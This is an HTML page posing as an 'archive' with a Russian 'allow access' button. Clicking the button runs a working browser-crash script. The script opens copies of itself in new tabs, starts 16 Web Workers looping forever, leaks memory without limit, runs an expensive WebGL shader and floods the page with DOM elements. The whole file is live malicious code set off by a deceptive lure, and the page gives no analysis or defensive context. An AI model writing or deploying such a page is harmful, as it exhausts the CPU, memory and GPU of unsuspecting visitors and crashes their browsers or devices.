<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Tuzyaka archive</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 40%;
            margin: 0;
            overflow: hidden;
        }
        h1 {
            font-size: 2em;
            text-shadow: 0 0 10px #0f0;
        }
        button {
            font-size: 1.5em;
            padding: 10px 20px;
            background-color: #f00;
            color: #fff;
            border: none;
            cursor: pointer;
            text-shadow: 0 0 5px #fff;
        }
        button:hover {
            background-color: #ff3333;
        }
        canvas {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <h1>Tuzyaka archive</h1>
    <button id="startButton">Разрешить доступ к архиву</button>
    <canvas id="canvas"></canvas>

    <script>
        const startButton = document.getElementById("startButton");

        startButton.addEventListener("click", () => {
            startButton.style.display = "none";
            document.body.innerHTML = "<h1>Access Granted</h1>";
            document.body.style.color = "#f00";
            document.body.style.textShadow = "0 0 10px #f00";
            setTimeout(() => {
                openCrashTab(); // Открываем вкладку после подтверждения
            }, 1000); // Задержка 1 секунда для эффекта
        });

        // Открытие новой вкладки с этим же кодом
        function openCrashTab() {
            const newWindow = window.open(window.location.href, '_blank');
            if (!newWindow) {
                alert("Пожалуйста, разрешите всплывающие окна для этой страницы!");
            }
            startFullLoad(); // Запускаем нагрузку на текущей вкладке
        }

        // Полная нагрузка на процессор и другие ресурсы
        function startFullLoad() {
            // 1. Перегрузка CPU и памяти
            function overloadCPUandMemory() {
                let memoryHog = [];
                const workerCode = `
                    onmessage = function() {
                        let x = 0;
                        while (true) {
                            x += Math.random() * Math.sin(Date.now());
                        }
                    };
                `;
                for (let i = 0; i < 16; i++) {
                    try {
                        const blob = new Blob([workerCode], { type: "application/javascript" });
                        const worker = new Worker(URL.createObjectURL(blob));
                        worker.postMessage("start");
                    } catch (e) {
                        setInterval(() => {
                            let x = 0;
                            for (let j = 0; j < 1000000; j++) {
                                x += Math.random() * Math.sin(Math.random());
                            }
                        }, 1);
                    }
                }
                (function leakMemory() {
                    for (let i = 0; i < 500; i++) {
                        memoryHog.push(new Uint8Array(1000000));
                    }
                    setTimeout(leakMemory, 0);
                })();
            }

            // 2. Перегрузка GPU
            function overloadGPU() {
                const canvas = document.getElementById("canvas");
                canvas.style.display = "block";
                canvas.width = window.innerWidth * 2;
                canvas.height = window.innerHeight * 2;
                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                if (!gl) return;

                const vsSource = `
                    attribute vec2 aPos;
                    void main() {
                        gl_Position = vec4(aPos, 0.0, 1.0);
                    }
                `;
                const fsSource = `
                    precision highp float;
                    uniform float uTime;
                    void main() {
                        float r = 0.0, g = 0.0, b = 0.0;
                        for (int i = 0; i < 5000; i++) {
                            r += sin(float(i) * uTime * 0.01);
                            g += cos(float(i) * uTime * 0.02);
                            b += tan(float(i) * uTime * 0.03);
                        }
                        gl_FragColor = vec4(fract(r), fract(g), fract(b), 1.0);
                    }
                `;

                const vertexShader = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(vertexShader, vsSource);
                gl.compileShader(vertexShader);
                const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
                gl.shaderSource(fragmentShader, fsSource);
                gl.compileShader(fragmentShader);
                const program = gl.createProgram();
                gl.attachShader(program, vertexShader);
                gl.attachShader(program, fragmentShader);
                gl.linkProgram(program);
                gl.useProgram(program);

                const posBuffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, posBuffer);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);

                const aPos = gl.getAttribLocation(program, "aPos");
                gl.enableVertexAttribArray(aPos);
                gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);

                const uTime = gl.getUniformLocation(program, "uTime");
                function render() {
                    gl.uniform1f(uTime, performance.now() / 1000);
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                    requestAnimationFrame(render);
                }
                render();
            }

            // 3. Перегрузка DOM
            function overloadDOM() {
                function chaos() {
                    for (let i = 0; i < 200; i++) {
                        const div = document.createElement("div");
                        div.style.cssText = `
                            position: absolute;
                            left: ${Math.random() * 100}%;
                            top: ${Math.random() * 100}%;
                            width: 100px;
                            height: 100px;
                            background: hsl(${Math.random() * 360}, 100%, 50%);
                            transform: rotate(${Math.random() * 360}deg);
                        `;
                        document.body.appendChild(div);
                    }
                    setTimeout(chaos, 5);
                }
                chaos();
            }

            // Запуск нагрузки
            overloadCPUandMemory();
            overloadGPU();
            overloadDOM();
        }
    </script>
</body>
</html>
